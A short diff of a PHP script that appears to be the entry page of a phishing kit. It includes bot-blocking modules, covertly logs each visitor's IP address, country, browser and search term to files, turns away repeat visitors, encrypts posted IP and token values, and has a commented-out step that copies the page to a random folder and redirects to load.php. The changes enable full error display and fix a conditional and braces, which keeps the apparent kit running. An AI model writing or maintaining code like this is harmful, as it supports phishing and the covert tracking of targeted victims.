@@ -4,6 +4,10 @@ include('engine/owaf.php');
 include('blocker.php');
 include('config.php');
 
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+error_reporting(E_ALL);
+
 function RandNumber($randstr)
 {
     $char = '0123456789';
@@ -334,6 +338,7 @@ $fp = fopen("visits.csv", "a");
 	fputs($fp, "\"".$searchterm."\",\"".$_SERVER['REMOTE_ADDR']."\",\"{$geoplugin->countryName}\",\"".$browser."\"\r\n");
 	fclose($fp);
 
+if (isset($visitors)) {
 if(strpos($visitors, "$searchterm") !== false)
 
 {
@@ -344,8 +349,8 @@ header("location: ../../");
 	$fp = fopen("visitors.txt", "a");
 	fputs($fp, "".$searchterm."\r\n");
 	fclose($fp);
-
-
+}
+}
 $iptoken = base64_encode(doDecrypt($_POST['ip']));
 $token_kr = urlencode(doEncrypt($_POST['token']));
 $random=rand(0,1000000000000);
@@ -516,5 +521,5 @@ else {
 /* $src="domain";
 recurse_copy( $src, $dst );
 header("Location: $dst/load.php?token=$token_kr"); */
-}
+
 ?>
